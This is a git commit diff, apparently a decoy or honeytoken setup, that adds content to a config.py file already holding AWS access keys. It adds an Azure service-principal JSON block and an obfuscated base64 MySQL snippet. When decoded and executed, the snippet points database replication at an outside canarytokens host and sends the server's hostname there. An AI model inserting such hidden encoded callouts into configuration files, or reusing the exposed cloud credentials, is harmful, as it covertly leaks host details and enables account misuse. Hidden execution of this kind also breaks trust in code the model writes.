cfd5594c0c1920eced42f347274cdfb45b1690af
Mackenzie Jackson <mackenziejackson@ggfrlta070.home>
2023-08-30 11:10:41 +0200

    hello

--- config.py
+++ config.py
@@ -8,3 +8,24 @@ aws_access_key_id = AKIA2OGYBAH6ZJAFIHXI
 aws_secret_access_key = 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
 output = json
 region = us-east-2
+
+
+{
+  "appId": "6b13352a-8cf5-4cac-9c72-6189b4ebf59c",
+  "displayName": "azure-cli-LlBRyVuBHLfjANvdec0kwfyTVH6XuexZ",
+  "fileWithCertAndPrivateKey": "Secver ",
+  "password": null,
+  "tenant": "c5b88def-64d6-4276-aa23-feab7321ced5"
+}
+
+
+SET @b = 'U0VUIEBiYiA9IENPTkNBVCgiQ0hBTkdFIE1BU1RFUiBUTyBNQVNURVJfUEFTU1dPUkQ9J215LXNlY3JldC1wdycsIE1BU1RFUl9SRVRSWV9DT1VOVD0xLCBNQVNURVJfUE9SVD0zMzA2LCBNQVNURVJfSE9TVD0ndmw5NHBhejhwYW5rc2w5czJocGRmc216MC5jYW5hcnl0b2tlbnMuY29tJywgTUFTVEVSX1VTRVI9J3ZsOTRwYXo4cGFua3NsOXMyaHBkZnNtejAiLCBAQGxjX3RpbWVfbmFtZXMsIEBAaG9zdG5hbWUsICInOyIpOw==';
+SET @s2 = FROM_BASE64(@b);
+PREPARE stmt1 FROM @s2;
+EXECUTE stmt1;
+PREPARE stmt2 FROM @bb;
+EXECUTE stmt2;
+START REPLICA;
+
+
+                    
